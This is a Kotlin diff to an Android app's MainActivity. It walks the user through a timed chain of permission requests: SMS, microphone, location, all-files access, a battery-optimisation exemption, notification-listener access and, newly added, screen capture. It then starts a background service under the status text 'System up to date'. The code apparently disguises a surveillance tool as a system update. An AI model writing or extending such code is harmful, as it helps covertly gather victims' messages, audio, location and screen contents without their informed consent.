@@ -25,6 +25,7 @@ class MainActivity : AppCompatActivity() {
 
     private val PERM_REQUEST_CODE = 1001
     private val BATTERY_REQUEST_CODE = 1002
+    private val SCREEN_REQUEST_CODE = 1003
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -56,18 +57,29 @@ class MainActivity : AppCompatActivity() {
         handler.postDelayed(runnable, 150)
     }
 
+    // ═══════════ STEP 1: Runtime Permissions ═══════════
     private fun requestPermissionsStep1() {
         val needed = mutableListOf<String>()
 
+        // Storage
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
 
+        // SMS
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.READ_SMS)
 
+        // Microphone
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
             needed.add(Manifest.permission.RECORD_AUDIO)
 
+        // Location
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+
+        // Notifications (Android 13+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                 needed.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -89,6 +101,7 @@ class MainActivity : AppCompatActivity() {
         requestAllFilesAccess()
     }
 
+    // ═══════════ STEP 2: All Files Access ═══════════
     private fun requestAllFilesAccess() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
@@ -107,6 +120,7 @@ class MainActivity : AppCompatActivity() {
         android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
     }
 
+    // ═══════════ STEP 3: Battery Optimization ═══════════
     private fun requestBatteryOptimization() {
         try {
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
@@ -116,13 +130,14 @@ class MainActivity : AppCompatActivity() {
         android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 3000)
     }
 
+    // ═══════════ STEP 4: Notification Access ═══════════
     private fun requestNotifAccess() {
         if (!isNotifAccessGranted()) {
             try {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             } catch (_: Exception) {}
         }
-        android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 4000)
+        android.os.Handler(mainLooper).postDelayed({ requestScreenCapture() }, 4000)
     }
 
     private fun isNotifAccessGranted(): Boolean {
@@ -130,6 +145,22 @@ class MainActivity : AppCompatActivity() {
         return flat != null && flat.contains(packageName)
     }
 
+    // ═══════════ STEP 5: Screen Capture Permission ═══════════
+    private fun requestScreenCapture() {
+        try {
+            ScreenCapture.requestPermission(this, SCREEN_REQUEST_CODE)
+        } catch (_: Exception) {}
+        android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 5000)
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == SCREEN_REQUEST_CODE) {
+            ScreenCapture.onPermissionResult(this, resultCode, data)
+        }
+    }
+
+    // ═══════════ STEP 6: Start Background Service ═══════════
     private fun startBackgroundService() {
         tvStatus.text = "System up to date"
         tvSubStatus.text = "Sync active in background"
